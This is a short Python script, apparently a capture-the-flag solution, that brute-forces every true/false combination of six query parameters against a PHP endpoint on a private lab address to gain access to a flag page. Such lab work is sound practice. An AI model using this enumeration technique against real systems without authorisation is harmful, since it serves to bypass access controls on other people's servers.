import itertools
import requests 

def try_combination(combination):
    base_url = "http://10.0.0.6/ctf_deploy/aclive/ddjS7HkE9M/A.php"
    params = {param: str(value).lower() for param, value in zip(parameters, combination)}
    response = requests.get(base_url, params=params)
    return response.text

parameters = ["OSA", "OSB", "OSC", "HSA", "HSB", "HSD"]

# Generate all possible combinations of True and False for the parameters
combinations = list(itertools.product([True, False], repeat=len(parameters)))

for combination in combinations:
    result = try_combination(combination)
    print(f"Combination: {combination}, Result: {result}")

# Note: Modify the script based on the actual response content to identify successful access.
# The correct combination is the one that results in successful access to the flag.php endpoint.
